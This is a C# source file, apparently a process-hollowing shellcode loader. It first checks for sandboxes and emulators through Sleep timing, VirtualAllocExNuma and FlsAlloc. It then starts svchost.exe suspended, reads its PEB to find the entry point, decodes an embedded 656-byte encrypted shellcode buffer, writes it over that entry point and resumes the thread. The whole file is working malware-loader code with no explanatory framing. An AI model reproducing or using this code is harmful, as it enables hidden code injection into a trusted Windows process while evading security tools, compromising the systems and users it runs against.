using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Hollow
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, 
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, 
            uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType,
            UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(4000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 3.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool resa = CreateProcess(null, "C:\\Windows\\SysWOW64\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[656] { 0x8c, 0xdf, 0xde, 0x44, 0x6a, 0x70, 0x57, 0xd8, 0xa1, 0x5b, 0xa2, 0x53, 0xda, 0x16, 0x5a, 0xfb, 0x65, 0x5d, 0xcf, 0x38, 0x64, 0x38, 0xe6, 0x0e, 0x4c, 0xfb, 0x45, 0x79, 0x75, 0x95, 0x41, 0xf7, 0xfd, 0x78, 0x0b, 0x0c, 0x35, 0x7d, 0x64, 0xab, 0xbf, 0x3a, 0x50, 0x83, 0x23, 0x05, 0xd8, 0x03, 0x13, 0xe1, 0x22, 0x27, 0xda, 0x06, 0x56, 0x71, 0xe7, 0xda, 0x04, 0x12, 0xf5, 0xf7, 0x25, 0x08, 0x6b, 0xa0, 0xbc, 0x09, 0x64, 0x6b, 0xa3, 0xbc, 0x19, 0x5c, 0x3a, 0xf5, 0xfe, 0x25, 0x78, 0x5b, 0x8f, 0x7e, 0xda, 0x70, 0xe1, 0x71, 0xe1, 0x60, 0x84, 0xab, 0xbf, 0x3a, 0xfd, 0x45, 0xad, 0x48, 0xd7, 0x24, 0xb0, 0x69, 0x0d, 0xcf, 0x6a, 0x39, 0x4e, 0x05, 0xd7, 0x09, 0xcf, 0x32, 0x54, 0x36, 0x82, 0x22, 0xe1, 0x7c, 0x7c, 0xda, 0x1c, 0x76, 0x71, 0xe4, 0xda, 0x40, 0xe1, 0x71, 0xe7, 0xd8, 0x00, 0x4e, 0x54, 0x6c, 0x0a, 0x25, 0x33, 0x2a, 0x66, 0xae, 0xa4, 0x32, 0x2f, 0x6d, 0xda, 0x56, 0x83, 0xf0, 0xc8, 0xae, 0xbb, 0x37, 0x18, 0x59, 0x34, 0x30, 0x6a, 0x18, 0x40, 0x38, 0x2a, 0x03, 0x24, 0x5f, 0x1d, 0x33, 0x4c, 0x77, 0xc8, 0x84, 0x75, 0xb1, 0x23, 0x64, 0x02, 0x17, 0x39, 0x98, 0x66, 0x51, 0x44, 0x6a, 0x3d, 0x58, 0x2b, 0x2d, 0x06, 0x1c, 0x56, 0x7e, 0x71, 0x44, 0x40, 0x17, 0x79, 0x13, 0x03, 0x1e, 0x53, 0x3e, 0x33, 0x19, 0x50, 0x79, 0x05, 0x64, 0x5b, 0x40, 0x19, 0x61, 0x7f, 0x4a, 0x27, 0x5e, 0x3f, 0x72, 0x5e, 0x4b, 0x17, 0x29, 0x72, 0x5e, 0x4b, 0x17, 0x23, 0x32, 0x50, 0x41, 0x05, 0x65, 0x6a, 0x5a, 0x59, 0x17, 0x16, 0x21, 0x09, 0x1b, 0x58, 0x7e, 0x76, 0x5a, 0x41, 0x07, 0x61, 0x75, 0x5a, 0x41, 0x17, 0x17, 0x2d, 0x18, 0x15, 0x51, 0x3e, 0x3c, 0x45, 0x41, 0x05, 0x65, 0x6a, 0x5a, 0x70, 0x5f, 0x6b, 0x12, 0x13, 0xd7, 0xc8, 0x84, 0x17, 0x39, 0x1a, 0x34, 0x02, 0x17, 0x02, 0xcb, 0x36, 0x51, 0x44, 0x82, 0x30, 0x36, 0x51, 0x44, 0x45, 0x04, 0x00, 0x68, 0x05, 0x2d, 0x46, 0x44, 0x17, 0x28, 0x20, 0x18, 0x7c, 0x0e, 0x01, 0x1c, 0x49, 0x7b, 0x13, 0x05, 0x1d, 0x1b, 0x76, 0x1f, 0x16, 0x19, 0x35, 0x44, 0x29, 0x0c, 0x21, 0x2f, 0x02, 0x14, 0x30, 0x59, 0x13, 0x7e, 0x38, 0x74, 0x33, 0x26, 0x76, 0x1a, 0x26, 0x5d, 0x17, 0x7b, 0x00, 0x30, 0x29, 0x46, 0x7b, 0x13, 0x1d, 0x29, 0x09, 0x05, 0x29, 0x3d, 0x06, 0x38, 0x6f, 0x39, 0x75, 0x39, 0x06, 0x71, 0x06, 0x16, 0x32, 0x35, 0x54, 0x08, 0x30, 0x26, 0x40, 0x02, 0x2b, 0x21, 0x05, 0x36, 0x63, 0x17, 0x28, 0x0d, 0x44, 0x52, 0x14, 0x2c, 0x5c, 0x0a, 0x55, 0x27, 0x06, 0x1b, 0x29, 0x70, 0x66, 0x16, 0x3c, 0x21, 0x7d, 0x12, 0x13, 0x5f, 0x28, 0x7d, 0x38, 0x75, 0x2f, 0x41, 0x6e, 0x29, 0x03, 0x5b, 0x3d, 0x75, 0x00, 0x34, 0x21, 0x45, 0x40, 0x12, 0x74, 0x5d, 0x48, 0x4d, 0x1b, 0x09, 0x2c, 0x28, 0x00, 0x19, 0x20, 0x53, 0x37, 0x59, 0x15, 0x1d, 0x32, 0x28, 0x4f, 0x33, 0x3c, 0x02, 0x5d, 0x76, 0x10, 0x33, 0x2d, 0x04, 0x45, 0x3d, 0x16, 0x00, 0x3d, 0x41, 0x39, 0x69, 0x01, 0x0a, 0x56, 0x13, 0x16, 0x1b, 0x25, 0x03, 0x1c, 0x37, 0x19, 0x24, 0x6f, 0x1a, 0x71, 0x5c, 0x70, 0x67, 0x39, 0x13, 0xe3, 0xef, 0xf1, 0xae, 0x91, 0xe3, 0xb6, 0x64, 0x39, 0x44, 0x58, 0x98, 0xb3, 0x02, 0x17, 0x39, 0x27, 0x64, 0x07, 0x2c, 0x81, 0x25, 0x19, 0x6a, 0xbb, 0xbf, 0xe6, 0x5d, 0x5b, 0x1b, 0x02, 0xf0, 0x04, 0x51, 0x44, 0xe3, 0x90, 0x5d, 0x55, 0x14, 0x00, 0x6f, 0x61, 0x39, 0x31, 0x2c, 0xee, 0xb1, 0xae, 0x91, 0x39, 0x23, 0x64, 0x02, 0x12, 0x02, 0x5d, 0x31, 0x49, 0x3f, 0x95, 0xa5, 0xb2, 0x91, 0x31, 0x7e, 0x18, 0xbf, 0x42, 0x44, 0x6a, 0x18, 0x73, 0xa1, 0x71, 0x8a, 0x8f, 0xe2, 0x1e, 0x31, 0xa7, 0x98, 0x7c, 0x51, 0x44, 0x6a, 0x1a, 0x77, 0x39, 0x44, 0x7a, 0x70, 0x37, 0x39, 0x44, 0x6a, 0x30, 0x37, 0x02, 0x2c, 0x32, 0xd4, 0x64, 0xb4, 0xbb, 0xbf, 0xe3, 0x64, 0x02, 0xcd, 0x8d, 0x27, 0x5f, 0x51, 0x64, 0x6a, 0x70, 0x64, 0x07, 0x2c, 0x78, 0xe6, 0xbe, 0xb3, 0xbb, 0xbf, 0xf5, 0xf7, 0x25, 0x8b, 0xe1, 0x77, 0x36, 0x92, 0xc1, 0xaa, 0x05, 0xd2, 0x09, 0x87, 0x35, 0x98, 0x5c, 0xae, 0xbb, 0x95, 0x41, 0x0e, 0x63, 0x6a, 0x5b, 0x46, 0x0f, 0x7f, 0x70, 0x5f, 0x5e, 0x06, 0x69, 0x75, 0x6a, 0xcb, 0xd7, 0x4c, 0x6e, 0x60, 0x18, 0x91, 0xc4, 0xf9, 0xf7, 0x8f, 0xe2, 0x6d, 0x42, 0x16, 0x7a, 0xb7, 0xaa, 0xa4, 0x1f, 0x75, 0x8c, 0x16, 0x57, 0x18, 0x1f, 0x5d, 0x51, 0x17, 0x95, 0xa5 };

            BlowMe bm = new BlowMe();
            buf = bm.Decode(buf, 656);
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
            //}

            //byte[] k = new byte[5] { 0x70, 0x37, 0x51, 0x44, 0x6a };
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ k[i % k.Length]);
            //}

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
